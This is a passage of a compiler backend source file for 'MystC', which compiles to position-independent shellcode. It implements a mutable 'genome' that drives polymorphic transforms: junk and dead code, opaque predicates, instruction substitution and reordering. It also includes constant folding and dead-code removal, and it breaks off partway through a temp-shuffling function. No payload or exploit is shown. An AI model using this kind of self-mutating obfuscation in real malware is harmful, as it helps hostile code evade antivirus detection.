// backend_mystc.mc - MystC polymorphic backend (unified Win32 + Linux source)
// Compiled to bytecode by the Python frontend, then to shellcode by the C backend.
//
// Step 1 — compile source to bytecode (any platform):
//   python3 frontend/mystcc.py backend/backend_mystc.mc -o backend/backend_mystc.mcb
//
// Step 2 — compile bytecode to shellcode with the C backend:
//
//   Windows (MSVC):
//     cl /Fe:backend_mystc.exe backend/backend_mystc.c /O2
//     backend_mystc.exe backend/backend_mystc.mcb --pic backend/backend_mystc.bin
//
//   Windows (GCC/MinGW):
//     gcc -O2 -o backend_mystc.exe backend/backend_mystc.c
//     backend_mystc.exe backend/backend_mystc.mcb --pic backend/backend_mystc.bin
//
//   Linux (GCC):
//     gcc -O2 -o backend_mystc backend/backend_mystc.c
//     ./backend_mystc backend/backend_mystc.mcb --pic backend/backend_mystc.bin
//     # Produces a Linux-targeted shellcode (cdecl calling convention)
//     # because backend_mystc.c detects Linux via #ifdef __linux__
//
// The resulting backend_mystc.bin is used by the PIC loader for testing.
// Standalone PE/ELF programs #include this file as a library.

// Standard library + platform APIs
#include "stdlib.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. Genome Module
//   2. IR Module
//   3. Bytecode Module
//   4. x86 Module
//   5. Code Generator Module
//   6. Assemble Module
//   7. Backend Module
// =============================================================================

// =============================================================================
//
// Genome Module
//
// Contains the following sections:
//   1. Genome
//   2. Mutation PRNG for genome
//
// =============================================================================

// =============================================================================
// Genome — mutable probability landscape for polymorphic decisions
// All gene values stored as flat int* arrays (MystC has no struct arrays).
// Layout: IR(13) + x86 poly(34) + x86 xform(12) + expression(2) + reorder(4) = 65 total
// =============================================================================

// Genome on-disk layout (see docs/genome.md):
//   [0..3]   magic "GENE"
//   [4..5]   version
//   [6]      temperature
//   [7]      reserved
//   [8..137] 65 genes * 2 bytes (signed int16 each; expression_flags = gene 59,
//            expression_rate = gene 60, reorder genes = 61..64)
// Total: 138 bytes.
//
// GENOME_MIN_SIZE is a backward-compat threshold: 130 bytes covers the header
// plus genes 0..60, enough to read expression_flags. Shorter genomes are
// accepted but skip the genome-derived flag overrides.

int* g_genome;         // 65-element int array of gene values
int  g_genome_loaded;  // 1 if genome was loaded from binary, 0 = defaults

// Gene index constants (offsets into g_genome[])
// IR genes
int GI_UNFOLD_CHANCE      = 0;   // 1 value
int GI_UNFOLD_WEIGHTS     = 1;   // 4 values  [1..4]
int GI_SUBSTITUTE_CHANCE  = 5;   // 1 value
int GI_DEAD_CODE_CHANCE   = 6;   // 1 value
int GI_DEAD_CODE_WEIGHTS  = 7;   // 4 values  [7..10]
int GI_NOP_CHANCE          = 11;  // 1 value
int GI_NOP_MAX_COUNT       = 12;  // 1 value
// X86 poly genes
int GI_ADD_WEIGHTS         = 13;  // 5 values  [13..17]
int GI_SUB_WEIGHTS         = 18;  // 4 values  [18..21]
int GI_MOVI_WEIGHTS        = 22;  // 6 values  [22..27]
int GI_MOVI_ZERO_WEIGHTS   = 28;  // 3 values  [28..30]
int GI_MOVI_NEG1_WEIGHTS   = 31;  // 3 values  [31..33]
int GI_XOR_WEIGHTS         = 34;  // 3 values  [34..36]
int GI_CMP_WEIGHTS         = 37;  // 2 values  [37..38]
int GI_JUNK_SEQ_WEIGHTS    = 39;  // 8 values  [39..46]
// X86 transform genes
int GI_DEAD_PROLOGUE_PCT   = 47;
int GI_DEAD_BLOCK_PCT      = 48;
int GI_DEAD_INSTR_PCT      = 49;
int GI_OPAQUE_PCT          = 50;
int GI_OPAQUE_WEIGHTS      = 51;  // 3 values  [51..53]
int GI_JUNK_CALL_BLOCK_PCT = 54;
int GI_JUNK_CALL_INSTR_PCT = 55;
int GI_HARMLESS_BLOCK_PCT  = 56;
int GI_HARMLESS_INSTR_PCT  = 57;
int GI_JUNK_FUNC_PCT       = 58;
// Gene expression
int GI_EXPRESSION_FLAGS    = 59;
int GI_EXPRESSION_RATE     = 60;
int GI_EXPRESSION_FLAGS_OFFSET = 126;  // byte offset into binary genome (= 8 + 59*2)
// Reorder genes
int GI_REORDER_INSTRS_INTENSITY = 61;
int GI_REORDER_LOCALS_CHANCE    = 62;
int GI_REORDER_BLOCKS_CHANCE    = 63;
int GI_REORDER_FUNCS_CHANCE     = 64;
int GENOME_SIZE            = 65;
int GENOME_MIN_SIZE        = 130;  // backward-compat threshold for build_flags_from_genome

void init_default_genome() {
    int i;
    g_genome = malloc(GENOME_SIZE * 4);
    // IR genes
    g_genome[0] = 35;    // unfold_chance
    g_genome[1] = 250; g_genome[2] = 250; g_genome[3] = 250; g_genome[4] = 250;  // unfold_weights
    g_genome[5] = 40;    // substitute_chance
    g_genome[6] = 25;    // dead_code_chance
    g_genome[7] = 250; g_genome[8] = 250; g_genome[9] = 250; g_genome[10] = 250; // dead_code_weights
    g_genome[11] = 20;   // nop_chance
    g_genome[12] = 3;    // nop_max_count
    // X86 poly genes
    g_genome[13] = 200; g_genome[14] = 200; g_genome[15] = 200; g_genome[16] = 200; g_genome[17] = 200; // add
    g_genome[18] = 250; g_genome[19] = 250; g_genome[20] = 250; g_genome[21] = 250; // sub
    g_genome[22] = 166; g_genome[23] = 167; g_genome[24] = 167; g_genome[25] = 167; g_genome[26] = 167; g_genome[27] = 166; // movi
    g_genome[28] = 333; g_genome[29] = 333; g_genome[30] = 334; // movi_zero
    g_genome[31] = 333; g_genome[32] = 333; g_genome[33] = 334; // movi_neg1
    g_genome[34] = 333; g_genome[35] = 333; g_genome[36] = 334; // xor
    g_genome[37] = 500; g_genome[38] = 500; // cmp
    i = 39; while (i < 47) { g_genome[i] = 125; i = i + 1; } // junk_seq
    // X86 transform genes
    g_genome[47] = 30;   // dead_prologue_pct
    g_genome[48] = 20;   // dead_block_pct
    g_genome[49] = 10;   // dead_instr_pct
    g_genome[50] = 5;    // opaque_pct
    g_genome[51] = 333; g_genome[52] = 333; g_genome[53] = 334; // opaque_weights
    g_genome[54] = 8;    // junk_call_block_pct
    g_genome[55] = 3;    // junk_call_instr_pct
    g_genome[56] = 3;    // harmless_block_pct
    g_genome[57] = 1;    // harmless_instr_pct
    g_genome[58] = 50;   // junk_func_pct: 50% of real functions
    // Gene expression
    g_genome[59] = 0x7FFF; // expression_flags: all 15 bits set
    g_genome[60] = 5;     // expression_rate: 5%
    // Reorder genes
    g_genome[61] = 2;     // reorder_instrs_intensity: 2x multiplier (matches hardcoded default)
    g_genome[62] = 100;   // reorder_locals_chance: always
    g_genome[63] = 100;   // reorder_blocks_chance: always
    g_genome[64] = 100;   // reorder_funcs_chance: always
    g_genome_loaded = 0;
}

void load_genome_binary(char* data, int size) {
    int i;
    int p;
    if (size < 8) { return; }
    if (data[0] != 0x47 || data[1] != 0x45 || data[2] != 0x4E || data[3] != 0x45) { return; } // "GENE"
    p = 8; // skip magic(4) + version(2) + reserved(2)
    i = 0;
    while (i < GENOME_SIZE && p + 2 <= size) {
        g_genome[i] = read_i16(data, p);
        p = p + 2;
        i = i + 1;
    }
    g_genome_loaded = 1;

    // Clamp probability genes to [0,100] (match C backend)
    if (g_genome[GI_UNFOLD_CHANCE] > 100) { g_genome[GI_UNFOLD_CHANCE] = 100; }
    if (g_genome[GI_SUBSTITUTE_CHANCE] > 100) { g_genome[GI_SUBSTITUTE_CHANCE] = 100; }
    if (g_genome[GI_DEAD_CODE_CHANCE] > 100) { g_genome[GI_DEAD_CODE_CHANCE] = 100; }
    if (g_genome[GI_NOP_CHANCE] > 100) { g_genome[GI_NOP_CHANCE] = 100; }
    if (g_genome[GI_DEAD_PROLOGUE_PCT] > 100) { g_genome[GI_DEAD_PROLOGUE_PCT] = 100; }
    if (g_genome[GI_DEAD_BLOCK_PCT] > 100) { g_genome[GI_DEAD_BLOCK_PCT] = 100; }
    if (g_genome[GI_DEAD_INSTR_PCT] > 100) { g_genome[GI_DEAD_INSTR_PCT] = 100; }
    if (g_genome[GI_OPAQUE_PCT] > 100) { g_genome[GI_OPAQUE_PCT] = 100; }
    if (g_genome[GI_JUNK_CALL_BLOCK_PCT] > 100) { g_genome[GI_JUNK_CALL_BLOCK_PCT] = 100; }
    if (g_genome[GI_JUNK_CALL_INSTR_PCT] > 100) { g_genome[GI_JUNK_CALL_INSTR_PCT] = 100; }
    if (g_genome[GI_HARMLESS_BLOCK_PCT] > 100) { g_genome[GI_HARMLESS_BLOCK_PCT] = 100; }
    if (g_genome[GI_HARMLESS_INSTR_PCT] > 100) { g_genome[GI_HARMLESS_INSTR_PCT] = 100; }
    // Clamp range genes
    if (g_genome[GI_NOP_MAX_COUNT] < 1) { g_genome[GI_NOP_MAX_COUNT] = 1; }
    if (g_genome[GI_NOP_MAX_COUNT] > 10) { g_genome[GI_NOP_MAX_COUNT] = 10; }
    if (g_genome[GI_JUNK_FUNC_PCT] < 0) { g_genome[GI_JUNK_FUNC_PCT] = 0; }
    if (g_genome[GI_JUNK_FUNC_PCT] > 200) { g_genome[GI_JUNK_FUNC_PCT] = 200; }
    // Clamp weight genes to [1, 900]
    i = 0;
    while (i < 4) { if (g_genome[GI_UNFOLD_WEIGHTS + i] < 1) { g_genome[GI_UNFOLD_WEIGHTS + i] = 1; } if (g_genome[GI_UNFOLD_WEIGHTS + i] > 900) { g_genome[GI_UNFOLD_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 4) { if (g_genome[GI_DEAD_CODE_WEIGHTS + i] < 1) { g_genome[GI_DEAD_CODE_WEIGHTS + i] = 1; } if (g_genome[GI_DEAD_CODE_WEIGHTS + i] > 900) { g_genome[GI_DEAD_CODE_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 5) { if (g_genome[GI_ADD_WEIGHTS + i] < 1) { g_genome[GI_ADD_WEIGHTS + i] = 1; } if (g_genome[GI_ADD_WEIGHTS + i] > 900) { g_genome[GI_ADD_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 4) { if (g_genome[GI_SUB_WEIGHTS + i] < 1) { g_genome[GI_SUB_WEIGHTS + i] = 1; } if (g_genome[GI_SUB_WEIGHTS + i] > 900) { g_genome[GI_SUB_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 6) { if (g_genome[GI_MOVI_WEIGHTS + i] < 1) { g_genome[GI_MOVI_WEIGHTS + i] = 1; } if (g_genome[GI_MOVI_WEIGHTS + i] > 900) { g_genome[GI_MOVI_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 3) { if (g_genome[GI_MOVI_ZERO_WEIGHTS + i] < 1) { g_genome[GI_MOVI_ZERO_WEIGHTS + i] = 1; } if (g_genome[GI_MOVI_ZERO_WEIGHTS + i] > 900) { g_genome[GI_MOVI_ZERO_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 3) { if (g_genome[GI_MOVI_NEG1_WEIGHTS + i] < 1) { g_genome[GI_MOVI_NEG1_WEIGHTS + i] = 1; } if (g_genome[GI_MOVI_NEG1_WEIGHTS + i] > 900) { g_genome[GI_MOVI_NEG1_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 3) { if (g_genome[GI_XOR_WEIGHTS + i] < 1) { g_genome[GI_XOR_WEIGHTS + i] = 1; } if (g_genome[GI_XOR_WEIGHTS + i] > 900) { g_genome[GI_XOR_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 2) { if (g_genome[GI_CMP_WEIGHTS + i] < 1) { g_genome[GI_CMP_WEIGHTS + i] = 1; } if (g_genome[GI_CMP_WEIGHTS + i] > 900) { g_genome[GI_CMP_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 8) { if (g_genome[GI_JUNK_SEQ_WEIGHTS + i] < 1) { g_genome[GI_JUNK_SEQ_WEIGHTS + i] = 1; } if (g_genome[GI_JUNK_SEQ_WEIGHTS + i] > 900) { g_genome[GI_JUNK_SEQ_WEIGHTS + i] = 900; } i = i + 1; }
    i = 0;
    while (i < 3) { if (g_genome[GI_OPAQUE_WEIGHTS + i] < 1) { g_genome[GI_OPAQUE_WEIGHTS + i] = 1; } if (g_genome[GI_OPAQUE_WEIGHTS + i] > 900) { g_genome[GI_OPAQUE_WEIGHTS + i] = 900; } i = i + 1; }
    // Clamp reorder genes
    if (g_genome[GI_REORDER_INSTRS_INTENSITY] < 1) { g_genome[GI_REORDER_INSTRS_INTENSITY] = 1; }
    if (g_genome[GI_REORDER_INSTRS_INTENSITY] > 10) { g_genome[GI_REORDER_INSTRS_INTENSITY] = 10; }
    if (g_genome[GI_REORDER_LOCALS_CHANCE] > 100) { g_genome[GI_REORDER_LOCALS_CHANCE] = 100; }
    if (g_genome[GI_REORDER_BLOCKS_CHANCE] > 100) { g_genome[GI_REORDER_BLOCKS_CHANCE] = 100; }
    if (g_genome[GI_REORDER_FUNCS_CHANCE] > 100) { g_genome[GI_REORDER_FUNCS_CHANCE] = 100; }
}

// =============================================================================
// Mutation PRNG for genome (independent from compilation PRNG)
// =============================================================================

int g_mut_state;

void mut_seed(int s) {
    g_mut_state = s;
    if (g_mut_state == 0) { g_mut_state = 1; }
}

int mut_next() {
    int r;
    g_mut_state = g_mut_state * 1103515245 + 12345;
    r = g_mut_state / 0x10000;
    if (r < 0) { r = 0 - r; }
    return r;
}

int mut_range(int n) {
    if (n <= 1) { return 0; }
    return mut_next() % n;
}

int clamp_temperature(int t) {
    if (t < 0) { return 0; }
    if (t > 100) { return 100; }
    return t;
}

// Mutate a serialized 138-byte genome buffer in place. Operates on the binary
// form (`"GENE"` + version + reserved + 65 × i16) — what bundles carry in
// their `.data` and what `genome_from_binary()` consumes. Distinct from the
// in-memory mutator that the C backend uses on `struct Genome`.
void mutate_genome(char* buf, int size) {
    int temperature; int step; int mutation_count; int gene_count;
    int m; int idx; int offset; int val; int delta;
    int expr_rate; int expr_flags; int bit; int t_step; int t_delta;
    if (size < 10) { return; }
    temperature = clamp_temperature(buf[6] & 0xFF);
    step = 1 + temperature / 10;
    mutation_count = 1 + temperature / 20;
    gene_count = (size - 8) / 2;
    m = 0;
    while (m < mutation_count) {
        idx = mut_range(gene_count);
        offset = 8 + idx * 2;
        val = read_i16(buf, offset);
        delta = mut_range(2 * step + 1) - step;
        val = val + delta;
        if (val < 0) { val = 0; }
        if (val > 1000) { val = 1000; }
        write_i16(buf, offset, val);
        m = m + 1;
    }
    if (gene_count >= 61) {
        expr_rate = read_i16(buf, 128);
        if (expr_rate < 0) { expr_rate = 0; }
        if (expr_rate > 100) { expr_rate = 100; }
        expr_flags = read_i16(buf, GI_EXPRESSION_FLAGS_OFFSET);
        bit = 0;
        while (bit < 15) {
            if (mut_range(100) < expr_rate) { expr_flags = expr_flags ^ (1 << bit); }
            bit = bit + 1;
        }
        expr_flags = expr_flags & 0x7FFF;
        write_i16(buf, GI_EXPRESSION_FLAGS_OFFSET, expr_flags);
    }
    t_step = 1 + temperature / 20;
    t_delta = mut_range(2 * t_step + 1) - t_step;
    temperature = clamp_temperature(temperature + t_delta);
    buf[6] = temperature;
}

// Weighted selection: pick index 0..n-1 from weights at g_genome[gene_offset]
int genome_pick(int gene_offset, int n) {
    int total;
    int i;
    int r;
    int cum;
    total = 0;
    i = 0;
    while (i < n) {
        total = total + g_genome[gene_offset + i];
        i = i + 1;
    }
    if (total <= 0) { return prng_range(n); }
    r = prng_range(total);
    cum = 0;
    i = 0;
    while (i < n - 1) {
        cum = cum + g_genome[gene_offset + i];
        if (r < cum) { return i; }
        i = i + 1;
    }
    return n - 1;
}

// =============================================================================
//
// IR Module
//
// Contains the following sections:
//   1. IR Data Structures
//   2. IR Manipulation Helpers
//   3. IR Optimization
//   4. IR Transformations
//
// =============================================================================

// =============================================================================
// IR Data Structures
// =============================================================================

// Type codes
int TC_VOID = 0;
int TC_I8 = 1;
int TC_I32 = 2;
int TC_PTR = 3;

// IR Opcodes
int OP_NOP   = 0x00;
int OP_CONST = 0x01;
int OP_COPY  = 0x02;
int OP_ADD = 0x10;
int OP_SUB = 0x11;
int OP_MUL = 0x12;
int OP_DIV = 0x13;
int OP_MOD = 0x14;
int OP_NEG = 0x15;
int OP_AND = 0x20;
int OP_OR  = 0x21;
int OP_XOR = 0x22;
int OP_NOT = 0x23;
int OP_SHL = 0x24;
int OP_SHR = 0x25;
int OP_EQ = 0x30;
int OP_NE = 0x31;
int OP_LT = 0x32;
int OP_LE = 0x33;
int OP_GT = 0x34;
int OP_GE = 0x35;
int OP_LOAD     = 0x40;
int OP_STORE    = 0x41;
int OP_ADDR     = 0x42;
int OP_PTRADD   = 0x43;
int OP_FIELDPTR = 0x44;
int OP_ALLOCA   = 0x45;
int OP_JMP = 0x50;
int OP_JZ  = 0x51;
int OP_JNZ = 0x52;
int OP_CALL      = 0x60;
int OP_CALLV     = 0x61;
int OP_RET       = 0x62;
int OP_RETV      = 0x63;
int OP_ICALL     = 0x64;  // Indirect call through variable (function pointer)
int OP_ICALLV    = 0x65;  // Indirect void call through variable
int OP_FUNC_ADDR = 0x66;  // Get code address of a function
int OP_SYSCALL   = 0x67;  // Linux INT 0x80 syscall
int OP_EMIT = 0x70;

// Value kinds
int VK_TEMP = 0;
int VK_PARAM = 1;
int VK_LOCAL = 2;
int VK_GLOBAL = 3;
int VK_CONST = 4;
int VK_STRING = 5;
int VK_FUNC = 6;
int VK_TEMP_EXT = 0x80;

struct Operand {
    int kind;
    int index;
    int value;
};

struct Instruction {
    int opcode;
    struct Operand dest;
    struct Operand src1;
    struct Operand src2;
    int type_code;
    int target_block;
    int func_idx;
    int arg_count;
    struct Operand* args;
    int offset;
    int elem_size;
    // For OP_EMIT: inline raw bytes
    int raw_count;
    char* raw_bytes;
};

struct Block {
    char* label;
    struct Instruction* instrs;
    int instr_count;
};

struct Function {
    char* name;
    int name_idx;
    int return_type;
    int* param_types;
    int param_count;
    int* local_types;
    int* local_sizes;
    int local_count;
    struct Block* blocks;
    int block_count;
    int temp_count;
    int dll_idx;
    char* dll_name;
    int api_slot;
};

struct Global {
    char* name;
    int name_idx;
    int type_code;
    int size;
    int init_kind;
    int init_value;
};

struct Module {
    char** strings;
    int string_count;
    struct Global* globals;
    int global_count;
    struct Function* funcs;
    int func_count;
    int entry_func;
};

// Compile output struct for in-memory compilation
struct CompileOutput {
    char* bin_data;
    int bin_size;
    char* mc_data;
    int mc_size;
};

// Compile flags (additive — default is no transforms)
int CF_VERBOSE             = 0x00001;
int CF_EMIT_MC             = 0x00002;
// IR transform flags
int CF_IR_OBFUSCATE_NAMES  = 0x00004;
int CF_IR_UNFOLD           = 0x00008;
int CF_IR_SUBSTITUTE       = 0x00010;
int CF_IR_DEADCODE         = 0x00020;
int CF_IR_NOPS             = 0x00040;
int CF_IR_REORDER_INSTRS   = 0x00080;
int CF_IR_REORDER_LOCALS   = 0x00100;
int CF_IR_REORDER_BLOCKS   = 0x00200;
int CF_IR_REORDER_FUNCS    = 0x00400;
// X86 transform flags
int CF_X86_POLY_INSTRS     = 0x00800;
int CF_X86_DEAD_CODE       = 0x01000;
int CF_X86_OPAQUE          = 0x02000;
int CF_X86_JUNK_FUNCS      = 0x04000;
int CF_X86_HARMLESS_CALLS  = 0x08000;
int CF_X86_SHUFFLE_FUNCS   = 0x10000;
int CF_CDECL_EXTERNS       = 0x20000;  // force cdecl (caller cleans args) for all external calls
int CF_ABS_PE              = 0x40000;  // absolute addressing for standalone PE output
int CF_ABS_ELF             = 0x80000;  // absolute addressing for standalone ELF output
int CF_SCATTER_ELF         = 0x100000; // PIC data + abs extern calls for ELF scatter

// =============================================================================
// IR Manipulation Helpers (pointer-safe: no struct-by-value)
// =============================================================================

void init_instr(struct Instruction* ins, int opcode) {
    ins->opcode = opcode;
    ins->dest.kind = 0;
    ins->dest.index = 0;
    ins->dest.value = 0;
    ins->src1.kind = 0;
    ins->src1.index = 0;
    ins->src1.value = 0;
    ins->src2.kind = 0;
    ins->src2.index = 0;
    ins->src2.value = 0;
    ins->type_code = 0;
    ins->target_block = 0;
    ins->func_idx = 0;
    ins->arg_count = 0;
    ins->args = 0;
    ins->offset = 0;
    ins->elem_size = 0;
    ins->raw_count = 0;
    ins->raw_bytes = 0;
}

void copy_instr(struct Instruction* dst, struct Instruction* src) {
    dst->opcode = src->opcode;
    dst->dest.kind = src->dest.kind;
    dst->dest.index = src->dest.index;
    dst->dest.value = src->dest.value;
    dst->src1.kind = src->src1.kind;
    dst->src1.index = src->src1.index;
    dst->src1.value = src->src1.value;
    dst->src2.kind = src->src2.kind;
    dst->src2.index = src->src2.index;
    dst->src2.value = src->src2.value;
    dst->type_code = src->type_code;
    dst->target_block = src->target_block;
    dst->func_idx = src->func_idx;
    dst->arg_count = src->arg_count;
    dst->args = src->args;
    dst->offset = src->offset;
    dst->elem_size = src->elem_size;
    dst->raw_count = src->raw_count;
    dst->raw_bytes = src->raw_bytes;
}

void copy_func(struct Function* dst, struct Function* src) {
    dst->name = src->name;
    dst->name_idx = src->name_idx;
    dst->return_type = src->return_type;
    dst->param_types = src->param_types;
    dst->param_count = src->param_count;
    dst->local_types = src->local_types;
    dst->local_sizes = src->local_sizes;
    dst->local_count = src->local_count;
    dst->blocks = src->blocks;
    dst->block_count = src->block_count;
    dst->temp_count = src->temp_count;
    dst->dll_idx = src->dll_idx;
    dst->dll_name = src->dll_name;
    dst->api_slot = src->api_slot;
}

void block_insert_instrs(struct Block* blk, int at, struct Instruction* new_instrs, int count) {
    int new_count;
    struct Instruction* new_arr;
    int i;
    new_count = blk->instr_count + count;
    new_arr = malloc(sizeof(struct Instruction) * (new_count + 1));
    i = 0;
    while (i < at) {
        copy_instr(&new_arr[i], &blk->instrs[i]);
        i = i + 1;
    }
    i = 0;
    while (i < count) {
        copy_instr(&new_arr[at + i], &new_instrs[i]);
        i = i + 1;
    }
    i = at;
    while (i < blk->instr_count) {
        copy_instr(&new_arr[i + count], &blk->instrs[i]);
        i = i + 1;
    }
    free(blk->instrs);
    blk->instrs = new_arr;
    blk->instr_count = new_count;
}

// Remove instruction at index idx from a block, shifting remaining left
void block_remove_instr(struct Block* blk, int idx) {
    int i;
    i = idx;
    while (i < blk->instr_count - 1) {
        copy_instr(&blk->instrs[i], &blk->instrs[i + 1]);
        i = i + 1;
    }
    blk->instr_count = blk->instr_count - 1;
}

// =============================================================================
// IR Optimization (reverse of expansion transforms)
// =============================================================================

// Optimize: fold CONST a; CONST b; ADD/SUB/XOR -> CONST result
void optimize_fold_constants(struct Function* func) {
    int* use_count;
    int b;
    int i;
    int a;
    struct Block* blk;
    struct Instruction* i0;
    struct Instruction* i1;
    struct Instruction* i2;
    int a_val;
    int b_val;
    int result;

    if (func->block_count == 0) { return; }

    // Build use_count for all temps
    use_count = malloc(func->temp_count * 4);
    i = 0;
    while (i < func->temp_count) {
        use_count[i] = 0;
        i = i + 1;
    }

    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i < blk->instr_count) {
            if (blk->instrs[i].src1.kind == VK_TEMP) {
                use_count[blk->instrs[i].src1.index] = use_count[blk->instrs[i].src1.index] + 1;
            }
            if (blk->instrs[i].src2.kind == VK_TEMP) {
                use_count[blk->instrs[i].src2.index] = use_count[blk->instrs[i].src2.index] + 1;
            }
            if (blk->instrs[i].opcode == OP_CALL || blk->instrs[i].opcode == OP_CALLV
                || blk->instrs[i].opcode == OP_ICALL || blk->instrs[i].opcode == OP_ICALLV
                || blk->instrs[i].opcode == OP_SYSCALL) {
                a = 0;
                while (a < blk->instrs[i].arg_count) {
                    if (blk->instrs[i].args[a].kind == VK_TEMP) {
                        use_count[blk->instrs[i].args[a].index] = use_count[blk->instrs[i].args[a].index] + 1;
                    }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }

    // Pass 1: adjacent triple pattern (CONST, CONST, ADD/SUB/XOR)
    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i + 2 < blk->instr_count) {
            i0 = &blk->instrs[i];
            i1 = &blk->instrs[i + 1];
            i2 = &blk->instrs[i + 2];

            if (i0->opcode == OP_CONST && i0->dest.kind == VK_TEMP &&
                i1->opcode == OP_CONST && i1->dest.kind == VK_TEMP &&
                (i2->opcode == OP_ADD || i2->opcode == OP_SUB || i2->opcode == OP_XOR) &&
                i2->src1.kind == i0->dest.kind && i2->src1.index == i0->dest.index &&
                i2->src2.kind == i1->dest.kind && i2->src2.index == i1->dest.index &&
                use_count[i0->dest.index] == 1 && use_count[i1->dest.index] == 1) {

                a_val = i0->src1.value;
                b_val = i1->src1.value;
                result = 0;
                if (i2->opcode == OP_ADD) { result = a_val + b_val; }
                if (i2->opcode == OP_SUB) { result = a_val - b_val; }
                if (i2->opcode == OP_XOR) { result = a_val ^ b_val; }

                // Overwrite i0 as CONST dest, result
                i0->opcode = OP_CONST;
                i0->dest.kind = i2->dest.kind;
                i0->dest.index = i2->dest.index;
                i0->dest.value = i2->dest.value;
                i0->src1.kind = VK_CONST;
                i0->src1.index = 0;
                i0->src1.value = result;
                i0->src2.kind = 0;
                i0->src2.index = 0;
                i0->src2.value = 0;
                i0->type_code = i2->type_code;

                block_remove_instr(blk, i + 1);
                block_remove_instr(blk, i + 1);
                // Don't advance i - recheck
            } else {
                i = i + 1;
            }
        }
        b = b + 1;
    }

    // Pass 2: non-adjacent fold (handles scheduling-separated unfold patterns)
    // For each ADD/SUB/XOR with two single-use CONST temp sources, fold them
    {
        int j;
        int s1_idx;
        int s2_idx;
        int s1_pos;
        int s2_pos;
        int op_pos;

        b = 0;
        while (b < func->block_count) {
            blk = &func->blocks[b];
            i = 0;
            while (i < blk->instr_count) {
                i2 = &blk->instrs[i];
                if ((i2->opcode == OP_ADD || i2->opcode == OP_SUB || i2->opcode == OP_XOR) &&
                    i2->src1.kind == VK_TEMP && i2->src2.kind == VK_TEMP &&
                    use_count[i2->src1.index] == 1 && use_count[i2->src2.index] == 1) {
                    s1_idx = i2->src1.index;
                    s2_idx = i2->src2.index;
                    s1_pos = -1;
                    s2_pos = -1;
                    // Find CONST definitions in this block
                    j = 0;
                    while (j < i) {
                        if (blk->instrs[j].opcode == OP_CONST &&
                            blk->instrs[j].dest.kind == VK_TEMP) {
                            if (blk->instrs[j].dest.index == s1_idx) { s1_pos = j; }
                            if (blk->instrs[j].dest.index == s2_idx) { s2_pos = j; }
                        }
                        j = j + 1;
                    }
                    if (s1_pos >= 0 && s2_pos >= 0) {
                        a_val = blk->instrs[s1_pos].src1.value;
                        b_val = blk->instrs[s2_pos].src1.value;
                        result = 0;
                        if (i2->opcode == OP_ADD) { result = a_val + b_val; }
                        if (i2->opcode == OP_SUB) { result = a_val - b_val; }
                        if (i2->opcode == OP_XOR) { result = a_val ^ b_val; }
                        // Replace the op with CONST
                        i2->opcode = OP_CONST;
                        i2->src1.kind = VK_CONST;
                        i2->src1.index = 0;
                        i2->src1.value = result;
                        i2->src2.kind = 0;
                        i2->src2.index = 0;
                        i2->src2.value = 0;
                        // NOP out the two CONST defs (DCE will clean up)
                        blk->instrs[s1_pos].opcode = OP_NOP;
                        blk->instrs[s2_pos].opcode = OP_NOP;
                    }
                }
                i = i + 1;
            }
            b = b + 1;
        }
    }

    free(use_count);
}

// Optimize: remove dead code (unused temp defs with no side effects)
void optimize_remove_dead_code(struct Function* func) {
    int* used;
    int b;
    int i;
    int a;
    struct Block* blk;
    int op;

    if (func->block_count == 0) { return; }

    // Build used[] for all temps
    used = malloc(func->temp_count * 4);
    i = 0;
    while (i < func->temp_count) {
        used[i] = 0;
        i = i + 1;
    }

    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i < blk->instr_count) {
            if (blk->instrs[i].src1.kind == VK_TEMP) {
                used[blk->instrs[i].src1.index] = 1;
            }
            if (blk->instrs[i].src2.kind == VK_TEMP) {
                used[blk->instrs[i].src2.index] = 1;
            }
            // STORE uses dest as source (the address to store to)
            if (blk->instrs[i].opcode == OP_STORE && blk->instrs[i].dest.kind == VK_TEMP) {
                used[blk->instrs[i].dest.index] = 1;
            }
            if (blk->instrs[i].opcode == OP_CALL || blk->instrs[i].opcode == OP_CALLV
                || blk->instrs[i].opcode == OP_ICALL || blk->instrs[i].opcode == OP_ICALLV
                || blk->instrs[i].opcode == OP_SYSCALL) {
                a = 0;
                while (a < blk->instrs[i].arg_count) {
                    if (blk->instrs[i].args[a].kind == VK_TEMP) {
                        used[blk->instrs[i].args[a].index] = 1;
                    }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }

    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = blk->instr_count - 1;
        while (i >= 0) {
            if (blk->instrs[i].dest.kind == VK_TEMP && used[blk->instrs[i].dest.index] == 0) {
                op = blk->instrs[i].opcode;
                if (op == OP_NOP || op == OP_CONST || op == OP_COPY ||
                    op == OP_ADD || op == OP_SUB || op == OP_MUL || op == OP_DIV ||
                    op == OP_MOD || op == OP_NEG ||
                    op == OP_AND || op == OP_OR || op == OP_XOR || op == OP_NOT ||
                    op == OP_SHL || op == OP_SHR ||
                    op == OP_EQ || op == OP_NE || op == OP_LT || op == OP_LE ||
                    op == OP_GT || op == OP_GE || op == OP_PTRADD) {
                    block_remove_instr(blk, i);
                }
            }
            i = i - 1;
        }
        b = b + 1;
    }

    free(used);
}

// Transform: PRNG-shuffle temp indices (polymorphism)
void transform_shuffle_temps(struct Function* func) {
    int* perm;
    int n; int i; int j; int tmp;
    int b; int a;
    struct Instruction* ins;
    if (func->block_count == 0 || func->temp_count <= 1) { return; }
    n = func->temp_count;
    perm = malloc(n * 4);
    i = 0;
    while (i < n) { perm[i] = i; i = i + 1; }
    i = n - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
